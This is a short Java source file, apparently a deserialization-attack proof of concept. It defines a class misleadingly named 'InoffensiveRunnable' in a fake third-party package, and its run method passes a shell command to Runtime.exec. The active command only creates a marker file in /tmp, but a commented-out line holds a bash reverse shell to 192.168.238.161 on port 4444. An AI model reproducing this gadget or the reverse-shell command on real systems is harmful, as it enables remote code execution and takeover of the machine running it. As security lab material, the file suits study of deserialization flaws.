/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Some3rdLibrary;

import java.io.IOException;
import java.io.Serializable;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author root
 */
public class InoffensiveRunnable implements Runnable,Serializable{

    private final String command;
    public InoffensiveRunnable(){
    
    //command ="bash -i > /dev/tcp/192.168.238.161/4444 0>&1";
    command ="touch /tmp/alert";
    }
    
    @Override
    public void run() {
              try {
            Runtime.getRuntime().exec(command);
        } catch (IOException ex) {
            Logger.getLogger(DangerousH.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
    
    public String getCommand(){
    
    
    return command;
    }
    
}
